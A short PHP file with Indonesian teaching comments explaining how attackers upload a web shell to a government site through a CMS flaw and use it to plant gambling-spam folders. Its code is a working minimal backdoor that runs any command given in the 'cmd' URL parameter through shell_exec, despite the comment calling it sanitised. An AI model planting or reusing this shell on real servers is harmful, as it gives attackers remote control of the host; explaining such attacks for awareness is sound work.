<?php
// INI YANG DISEBUT "WEB SHELL" / PINTU BELAKANG (backdoor).
// Ini FILE YANG DI-UPLOAD PENYERANG KE SERVER lewat celah CMS.
// Fungsi utamanya: biar penyerang bisa "pegang remote" server dari browser.
// Contoh minimal (SAYA SANITASI, ini versi jendela untuk pelajaran):

// Kalau user buka:  situs.go.id/uploads/webshell.php?cmd=ls
// Server akan menjalankan perintah "ls" dan menampilkan hasilnya.
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
// Dengan akses ini, penyerang bisa: buat folder slot-gacor/, edit file, dst.
// TIDAK ADA satupun dari ini yang terlihat oleh pengunjung biasa —
// yang terlihat cuma HASIL-nya, yaitu folder slot-gacor-terbaru/.
?>
